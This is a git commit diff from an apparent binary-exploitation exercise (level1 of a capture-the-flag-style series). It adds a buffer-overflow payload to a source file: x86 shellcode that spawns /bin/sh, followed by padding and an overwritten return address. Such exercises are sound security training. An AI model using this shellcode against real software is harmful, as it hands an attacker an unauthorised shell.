ef6c78277ecf8b29484dd70a57f02c413f217430
rayan ferradi <ferradi.r@gmail.com>
2024-11-14 20:12:16 +0100

    level 2 en cours

--- level1/source.c
+++ level1/source.c
@@ -9,4 +9,5 @@ void run(void) {
     system("/bin/sh");
     return;
 }
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\xa0\x04\x08
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
